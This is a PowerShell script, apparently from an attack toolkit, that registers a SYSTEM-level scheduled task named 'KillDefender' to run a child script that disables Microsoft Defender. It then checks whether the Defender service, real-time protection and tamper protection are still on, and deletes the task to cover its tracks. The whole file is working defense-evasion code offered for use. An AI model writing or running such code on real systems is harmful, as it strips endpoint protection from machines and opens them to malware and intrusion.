# Register + run a SYSTEM scheduled task that executes kill-defender-child.ps1
$ErrorActionPreference = 'Continue'
$child = 'C:\Tools\cadre-attack\kill-defender-child.ps1'
if (-not (Test-Path $child)) { Write-Output "CHILD_MISSING"; exit 1 }

$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument ('-NoProfile -ExecutionPolicy Bypass -File ' + $child)
$principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit (New-TimeSpan -Minutes 5)
Register-ScheduledTask -TaskName 'KillDefender' -Action $action -Principal $principal -Settings $settings -Force | Out-Null
Write-Output "TASK_REGISTERED"
Start-ScheduledTask -TaskName 'KillDefender'
Start-Sleep -Seconds 10
Write-Output "--- CHILD LOG ---"
Get-Content 'C:\Tools\cadre-attack\kill-defender-child-out.txt' -ErrorAction SilentlyContinue
Write-Output "--- STATE ---"
$svc = Get-Service WinDefend -ErrorAction SilentlyContinue
if ($svc) {
  $sm = (Get-CimInstance Win32_Service -Filter "Name='WinDefend'" -ErrorAction SilentlyContinue).StartMode
  Write-Output "WINDEFEND=$($svc.Status)|startmode=$sm"
}
$st = Get-MpComputerStatus -ErrorAction SilentlyContinue
if ($st) { Write-Output "RTP=$($st.RealTimeProtectionEnabled) TP=$($st.IsTamperProtected) AV=$($st.AntivirusEnabled)" }
Unregister-ScheduledTask -TaskName 'KillDefender' -Confirm:$false -ErrorAction SilentlyContinue
Write-Output "TASK_CLEANED"
